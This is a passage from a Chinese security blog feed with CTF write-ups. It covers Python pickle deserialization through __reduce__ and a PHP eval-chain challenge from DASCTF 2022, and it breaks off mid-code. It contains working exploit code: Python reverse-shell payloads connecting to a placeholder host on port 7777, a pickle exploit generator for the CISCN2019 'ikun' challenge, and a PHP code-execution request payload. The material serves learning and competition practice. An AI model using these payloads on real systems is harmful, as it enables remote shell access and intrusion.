中指定的方式进行序列化，那如何进行指定呢？这就要从这个方法的返回值说起了，这个方法可以提供两种类型的返回值，分别是字符串<code>String</code>和元组<code>tuple</code>，当它返回<code>tuple</code>这种类型的时候，它里面可以设置2-5个参数，具体见下图：</p><p><img src="https://s2.loli.net/2022/05/23/C3ODIA1Y2q6nhcL.png" alt="image.png"></p><p>可以看到，其实最要的就是前两个参数，第一个参数提供一个可以调用的对象；第二个参数返回该可调用的对象的参数，是一个元组，如果该对象没有参数，那就需要传一个空元组；其实吧，这就是R操作码的底层实现，太像了，将元组和可调用的对象<code>callable</code>从堆栈中弹出来，然后以该元组作为参数调用该<code>callable</code>对象；后面的参数都是可选参数，看个例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/ls /&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/23/9yk5nKIp3O1vWuw.png" alt="image.png"></p><p>就像这样，利用反序列化执行任意命令，这是<code>python2</code>中的例子，接下来来看一个<code>python3</code>中反弹shell的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">reverse</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line"></span><br><span class="line">a = reverse()</span><br><span class="line">pickle.loads(pickle.dumps(a))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/23/Rulv9XVsObATNdF.png" alt="image.png"></p><h2 id="例题分析：-CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#例题分析：-CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="例题分析：[CISCN2019 华北赛区 Day1 Web2]ikun"></a>例题分析：[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>简单题，前面的jwt伪造那些我自动跳过了，直接看到源码，是拿<code>python2</code>写的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到<code>pickle.loads(urllib.unquote(become))</code>，也就是把我们传入的内容先<code>url</code>解码之后再反序列化，没有任何的过滤，那这个真的是相当友好了，直接反弹shell吧，构造<code>exp</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">reverse</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line"></span><br><span class="line">a = reverse()</span><br><span class="line"><span class="built_in">print</span>(urllib.quote(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/23/guJQnWkoCG4lAzO.png" alt="image.png"></p><p>如果是用<code>python3</code>写，也一样，只不过得指定版本为v0，还有url编码的方式不太一样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">reverse</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;xxx.xxx.xxx.xxx&quot;,7777));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line"></span><br><span class="line">a = reverse()</span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote(pickle.dumps(a,protocol=<span class="number">0</span>)))</span><br></pre></td></tr></table></figure><p>打过去就行：</p><p><img src="https://s2.loli.net/2022/05/23/lDqhv3FnyiCHOjT.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/05/23/5HmiTuKFyQzE8Ok.png" alt="image.png"></p><p>参考文章：</p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#3-PVM-%E6%93%8D%E4%BD%9C%E7%A0%81">https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#3-PVM-%E6%93%8D%E4%BD%9C%E7%A0%81</a></p><p><a href="https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#module-pickle">https://docs.python.org/zh-cn/3/library/pickle.html?highlight=__reduce#module-pickle</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;pickle反序列化&quot;&gt;&lt;a href=&quot;#pickle反序列化&quot; class=&quot;headerlink&quot; title=&quot;pickle反序列化&quot;&gt;&lt;/a&gt;pickle反序列化&lt;/h1&gt;&lt;p&gt;好久没更过博客了哈哈哈，最近事儿挺多的，有点儿迷茫，想学的东西太多了，抓不住重点了哈哈，而且国赛也快来了，还得为国赛刷很多的misc题；之前在&lt;code&gt;Y4&lt;/code&gt;师傅的博客里面看到过一句话，在迷茫的时候不要停止学习就好啦；接下来总结一下python反序列化中的pickle反序列化，这也是个老知识点了，之前一直欠着没学，借着这波准备国赛就把它总结咯&lt;/p&gt;</summary>
    
    
    
    
    <category term="反序列化" scheme="https://arsenetang.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="python" scheme="https://arsenetang.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>WP篇之2022DASCTF X FATE 四月挑战赛</title>
    <link href="https://arsenetang.github.io/2022/04/24/WP%E7%AF%87%E4%B9%8B2022DASCTF%20X%20FATE%20%E5%9B%9B%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>https://arsenetang.github.io/2022/04/24/WP%E7%AF%87%E4%B9%8B2022DASCTF%20X%20FATE%20%E5%9B%9B%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</id>
    <published>2022-04-23T16:00:00.000Z</published>
    <updated>2022-04-24T09:13:56.639Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2022DASCTF-X-FATE-四月挑战赛"><a href="#2022DASCTF-X-FATE-四月挑战赛" class="headerlink" title="2022DASCTF X FATE 四月挑战赛"></a>2022DASCTF X FATE 四月挑战赛</h1><p>麻了麻了又是坐牢的一天，太难了现在的比赛呜呜呜，比赛中还是只打出了一道web，第二道web又是思路清晰但又是没做出来，第三道是<code>java</code>题目前水平估计还做不出来就先放放，那就复现复现前两道吧</p><span id="more"></span><h2 id="1-warmup-php"><a href="#1-warmup-php" class="headerlink" title="1.warmup-php"></a>1.warmup-php</h2><p>一道纯粹的php代码审计的题，应该是某个cms改编的吧，看着头疼，一大堆没啥用的代码，接下来我就把关键代码放出来，更加方便理解一点儿：</p><p>入口文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">spl_autoload_register(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">&quot;./class/&quot;</span>.<span class="variable">$class</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$properties</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;properties&#x27;</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Action</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$action</span>,<span class="variable">$properties</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$object</span>=<span class="keyword">new</span> <span class="variable">$action</span>();</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$properties</span> <span class="keyword">as</span> <span class="variable">$name</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">            <span class="variable">$object</span>-&gt;<span class="variable">$name</span>=<span class="variable">$value</span>;</span><br><span class="line">        <span class="variable">$object</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Action(<span class="variable">$action</span>,<span class="variable">$properties</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到就是创建一个对象，参数都是可控的，<code>$action</code>应该就是类名，然后<code>$properties</code>是参数，很明显应该传入一个数组，下面有个<code>foreach</code>循环，给对象中的属性赋值，也就是说这个对象以及对象中的属性都是我们可以控制的，然后再调用该对象的<code>run</code>方法</p><p>然后接着看代码，先看<code>ListView.php</code>和<code>TestView.php</code>，都是简化过的代码，并且加进去了一些输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ListView</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$template</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;renderContent();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> preg_replace_callback(<span class="string">&quot;/&#123;(\w+)&#125;/&quot;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="string">&#x27;renderSection&#x27;</span>),<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">renderSection</span>(<span class="params"><span class="variable">$matches</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$method</span>=<span class="string">&#x27;render&#x27;</span>.<span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line">        var_dump(<span class="variable">$method</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>,<span class="variable">$method</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line">            <span class="variable">$html</span>=ob_get_contents();</span><br><span class="line">            ob_clean();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>TestView.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestView</span> <span class="keyword">extends</span> <span class="title">ListView</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rowHtmlOptionsExpression</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>=<span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableRow</span>(<span class="params"><span class="variable">$row</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$htmlOptions</span>=<span class="keyword">array</span>();</span><br><span class="line">        var_dump(<span class="variable">$row</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        var_dump(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression!==<span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data[<span class="variable">$row</span>];</span><br><span class="line">            var_dump(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$options</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line">                <span class="variable">$htmlOptions</span> = <span class="variable">$options</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableBody</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        <span class="variable">$n</span>=count(<span class="variable">$data</span>);</span><br><span class="line">        var_dump(<span class="variable">$n</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$row</span>=<span class="number">0</span>;<span class="variable">$row</span>&lt;<span class="variable">$n</span>;++<span class="variable">$row</span>)</span><br><span class="line">                <span class="keyword">$this</span>-&gt;renderTableRow(<span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简化过的代码看着就很舒服哈哈哈，<code>ListView</code>是一个抽象的父类，是不能被实例化的，然后<code>TestView</code>是它的子类，继承了它的方法，在入口处调用了该对象的<code>run()</code>方法，然后在<code>run()</code>方法中调用了<code>renderContent()</code>方法，在<code>renderContent()</code>中有一个<code>preg_replace_callback</code>，来看看这个方法咋个用的：</p><p><img src="https://s2.loli.net/2022/04/24/bLRdcH36Cynszhf.png" alt="image.png"></p><p>然后调入到<code>renderSection</code>方法中，在这里面可以调用任意的<code>render</code>方法，这里就调用<code>TestView</code>类中的<code>renderTableBody</code>方法，然后当<code>$data</code>不为空的时候，就会调用<code>renderTableRow($row)</code>这个方法，然后当<code>$this-&gt;rowHtmlOptionsExpression</code>不为空的时候就会调用<code>evaluateExpression</code>方法，这里就是终点了，看看它的代码吧：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evaluateExpression</span>(<span class="params"><span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        var_dump(<span class="variable">$_expression_</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(is_string(<span class="variable">$_expression_</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            extract(<span class="variable">$_data_</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$_expression_</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的<code>$_expression_</code>这个参数就是我们想要执行的php代码，也就是上面的<code>$this-&gt;rowHtmlOptionsExpression</code>这个参数，所以说最后的<code>payload</code>如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">properties[template]=&#123;TableBody&#125;&amp;properties[data]=123&amp;properties[rowHtmlOptionsExpression]=phpinfo()</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/24/hTExoZ7RKFHjIf9.png" alt="image.png"></p><h2 id="2-soeasy-php"><a href="#2-soeasy-php" class="headerlink" title="2.soeasy_php"></a>2.soeasy_php</h2><p>这个<code>soeasy</code> 我真的 哭死了</p><p>进去之后发现是一个上传点，可以上传任意文件，但都会被改名成png，这里想到有可能是<code>phar</code>反序列化</p><p>然后f12看看，发现有隐藏的东西，叫更换头像，把隐藏去掉然后抓个包</p><p><img src="https://s2.loli.net/2022/04/24/bjURcnCxGg69K8h.png" alt="image.png"></p><p>这里发现可以把任意文件都换成头像，那么我们就想到说不定这里可以任意文件读取，把想要读取的文件换成头像，然后访问头像就好了，看下图：</p><p><img src="https://s2.loli.net/2022/04/24/Zkg1q3NaYF94XtS.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/04/24/ND4sPTcHyJWZfv9.png" alt="image.png"></p><p>然后又怎么样呢，又不能把flag下下来哈哈哈，只能下载源码：</p><p><code>upload.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;请上传头像&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$filename</span> = md5(<span class="string">&quot;png&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;uploads/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$path</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;上传成功： &quot;</span>.<span class="variable">$path</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>edit.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&quot;error_reporting&quot;</span>,<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copyflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        exec(<span 